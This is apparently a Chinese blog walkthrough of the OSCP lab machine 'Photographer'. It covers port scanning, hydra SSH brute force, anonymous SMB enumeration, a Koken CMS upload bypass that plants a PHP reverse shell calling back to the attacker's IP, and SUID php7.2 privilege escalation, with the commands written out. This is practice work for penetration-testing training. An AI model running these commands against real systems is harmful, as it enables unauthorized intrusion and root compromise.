# 原创
：  从WEB到内网&&信息收集&&SMB枚举&&SUID提权-------打靶经验分享

# 从WEB到内网&amp;&amp;信息收集&amp;&amp;SMB枚举&amp;&amp;SUID提权-------打靶经验分享

## OSCP靶机----Photographer

今天来打一个OSCP的靶机，难度中等，包含了端口探测，服务探测，ssh爆破，SMB枚举，文件上传绕过，suid提权等等…靶场难度中等偏高，需要收集两个flag，一个flag低权限shell就可以获取，第二个要提权后才可以获取。希望大家看完可以有所收获。

### 启动环境

启动VPN：`openvpn universal.ovpn`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/47feb70b782bdd038fc44c5db3094622.jpeg"/><br/> 攻击机IP为：192.168.45.248<br/> 启动靶机：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b5a84cd47a696e3386ef79590f4ee200.jpeg"/><br/> 靶机IP为： 192.168.152.76

### 信息收集

#### 1.端口

nmap扫描端口<br/> `nmap --min-rate 10000 -p- 192.168.152.76`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9dceebf8942a2390391418e8cf798fdb.jpeg"/><br/> 靶机开放22，80，139，445，8000了五个端口<br/> 详细探测一下端口信息。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/949400e4e67ec36601e652ee40345817.jpeg"/><br/> 如下

```
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

```

#### 2.端口测试

**2.1 **22-ssh端口<br/> 发现开启的22是ssh端口，且版本为OpenSSH 7.2，搜一下有没有对应的脚本：<br/> `searchsploit OpenSSH 7.2`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cef2b51d1a8bc8fc2f279ea5e973d812.jpeg"/><br/> 发现有两个用户枚举。待定。<br/> 看一下ssh的版本信息<br/> `ssh root@192.168.152.76 -v`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/62ee7bcf781932d5c57bae2be1428e8f.jpeg"/><br/> 发现靶机支持密钥和密码登录。<br/> 手工弱口令试一下：<br/> `ssh root@192.168.152.76 -p 22`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ebcb60be3d6af59e465164448b570f38.jpeg"/><br/> 尝试了几个都没有成功登录，直接用hydra爆破<br/> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.152.76 ssh -s 22`<br/> 等待ing<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e49c905c99752f65c3d9944ab38c95a7.jpeg"/><br/> 老样子没有爆破出来。

**2.2**80-http<br/> 直接访问 192.168.152.76:80<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/50f7c4ac449b0cfeeedb9caff7d77ed0.jpeg"/><br/> 很精致的页面，应该是有cms，用whatweb看一下具体的cms：<br/> `whatweb http://192.168.152.76/`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5f72718ca5d543a6130000f1817328e7.jpeg"/><br/> cms应该是photographer，试着利用一下。<br/> `searchsploit Photographer`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a97ef3d7548e6fa3cb867c3631f96445.jpeg"/><br/> 好像不是。页面里到处点点看一下有没有功能点，好像也没有，那就扫一下目录：<br/> `dirsearch -u http://192.168.152.76/`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5197f6217665f88525d25fa2bea39567.jpeg"/><br/> 有三个，index.html是主页，还有/assets/,/images/,看一下http://192.168.152.76/images/<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/900a4457a5df7ca1d8f912f4607cb116.jpeg"/><br/> 是一个目录遍历。都是图片，没什么用。<br/> 看一下/assets/<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9b7bfc79a17c15da96bfd35a4f8d2f92.jpeg"/><br/> 是网站的css，js，图标等一些东西，还是没有用处。<br/> **2.3**445-SMB<br/> 前面的nmap探测到139和445都是一样的SMB服务。直接测试445端口<br/> 利用smbclient看一下SMB的内容。<br/> `smbclient -L //192.168.152.76`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fa17ff99711b65c858387e61c8ae1e8b.jpeg"/><br/> 空密码直接登上了，值得关注的是sambashare。看一下内容<br/> `smbclient //192.168.152.76/sambashare -U root`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a2f343e707ee407c6eb00983ae910d83.jpeg"/><br/> 一个txt，还有一个WP的备份文件，太大了，下载不了。<br/> 查看一下这个txt文件：

```
get mailsent.txt
cat mailsent.txt

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0a3621e0ae5c83b9818adb42e3f9822c.jpeg"/><br/> 可能是一个邮件的内容，发件人是agi@photographer.com,收件人daisa@photographer.com看一下翻译<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a34ea874dc1d3c86870352bfcc2877ea.jpeg"/><br/> 留言者一个给daisa建了一个站，推测秘密有可能是my babygril,也就是密码。先记下这里的东西。<br/> 试一下SMB枚举工具enum4linux抓一下用户名。<br/> `enum4linux 192.168.152.76`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a5123eb6c09d708018458e0c49f76ec1.jpeg"/><br/> WORKGROUP<br/> **2.4**8000–http<br/> http服务老规矩先访问一下：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e17673b6c72697469b830647cbef2ced.jpeg"/><br/> 巨卡无比，直接curl看看吧<br/> `curl http://192.168.152.76:8000`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ce2a10e2f7e5e115bca94fb902bd54b4.jpeg"/><br/> 看不出来什么。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1e07c38dde9816e9d4e6bf9167c21320.jpeg"/><br/> 终于加载进来了，我还以为我VPN挂了。没什么功能点，而且巨卡。看一下cms。<br/> `whatweb 192.168.152.76:8000/`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ca4982c01cc6410540c258a781748207.jpeg"/><br/> CMS是Koken 0.22.24，搜一下对应的exp<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/db8f8a9f8f4e1f99b3e8838fd05a15dc.jpeg"/><br/> 又任意文件上传，有搞头，看一下详情：<br/> `cat /usr/share/exploitdb/exploits/php/webapps/48706.txt`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3affc4fe991e21c9aedc5b702ae5e931.jpeg"/><br/> 教程是生成名字为*.php.jpg的木马，然后bp修改成.php就可以成功上传。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/148236fbd6130131127ccc1806ea901e.jpeg"/><br/> 访问一下样本的上传路径，发现是404，去掉第一级有一个api页面：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7b51c7a6b3d418456b598fcc45dc8504.jpeg"/><br/> 要文件上传肯定是要有上传点的，直接扫一下目录吧。<br/> `dirsearch -u http://192.168.152.76:8000/ -x 302,403`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1b1e9ef7bc936dea5d53a95131442919.jpeg"/><br/> 挺多，一个一个访问看一下。最终只有这个admin登录页面可以利用<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a884876814a0c3e0a0a54a9735a9b66b.jpeg"/>

### 攻击阶段

登录界面，用户名是邮箱，之前的那个邮件里就有邮箱。<br/> daisa@photographer.com，密码提示可能是my babygril<br/> 那就试一试，经过测试，密码是babygril成功登录。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4d2939824fb449d012b4bb9f7345138f.jpeg"/><br/> 依据之前收集的信息，这里肯定是一个上传点的，找一下。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/16b10e0e76969f649dc48c157d27b3b1.jpeg"/><br/> 在这里，按照之前exp的提示开始打。<br/> 1.启动burp<br/> 2.创建一个反弹shell的.php.jpg文件,php用kali自带的webshells<br/> `cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php.jpg`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/827072e9bc63de1ef256c25607fc72cd.jpeg"/><br/> 3.配置一下shell：

```
利用grep确定修改反弹shell_ip的第49行
 grep -n "127.0.0.1" shell.php.jpg 
 设置监听端口是第50行
 grep -n "1234" shell.php.jpg
 用sed命令替换里面的内容
 sed -i '49s/127.0.0.1/192.168.45.248/' shell.php.jpg
 sed -i '50s/1234/6666/' shell.php.jpg
 查看49与50行是否修改成功
 sed -n '49,50p' shell.php.jpg

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4b6559e2da5d9a3c6b0553c885ca1dc9.jpeg"/><br/> 4.启动nc监听：<br/> `nc -lvvp 6666`<br/> 5.burp进行shell的上传<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1e705579335fd14c8181cecbccabb953.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c6f5ec7731918ade572e77d17d9b6cf9.jpeg"/><br/> 修改两处，发包，抓到重定向的包，找到了上传的位置：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/85468083ad11b55ba0652e2caf8edb91.jpeg"/><br/> 访问上传的shell<br/> `curl http:\/\/192.168.152.76:8000\/storage\/originals\/d2\/eb\/shell.php`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5e5622ea398e4fb133db8fa60ff3490a.jpeg"/><br/> 成功弹到shell。

### 内网渗透

先用python获得新的交互shell<br/> `python -c "import pty;pty.spawn('/bin/bash')";`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5fcb4946eefabe41ce7b6c9f0e8968b5.jpeg"/><br/> 获取flag1<br/> `find / -name local.txt 2&gt;/dev/null`<br/> `cat /home/daisa/local.txt`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6d94bb9e0c255e4b9e416b4e77e15280.jpeg"/>

#### 提权

1.内核overlayfs提权<br/> `lsb_release -a`看看发行版本<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/60298a69c572f9170a905a348a3e6454.jpeg"/><br/> Ubuntu 16.04不行<br/> 2.低内核版本提权<br/> `uname -a`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b2a7a3059d8ae68146a57bcbb9b6f353.jpeg"/><br/> 内核版本为4.15.0，不行。<br/> 3.sudo提权<br/> `sudo -l`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8689970a1917828b6088bb2b62f29541.jpeg"/><br/> 要密码，不行。<br/> 4.suid提权<br/> `find / -perm -u=s -type f 2&gt;/dev/null`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/979928f33011aec51139990f0251d5fe.jpeg"/><br/> 有一个php，去https://gtfobins.github.io 找找。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1714a4ba3639e1e311d2838461c7ab9c.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2006e5ff73c51745d8eadca20224f7bc.jpeg"/><br/> 这里是php7.2，那就是<br/> `php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6cfc621f434ed3fa940007d2f0e3f2a6.jpeg"/><br/> 成功提权。<br/> 获取flag2<br/> `cat /root/proof.txt`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/eaf7da92c234b5a48d89c31119bb1f65.jpeg"/>
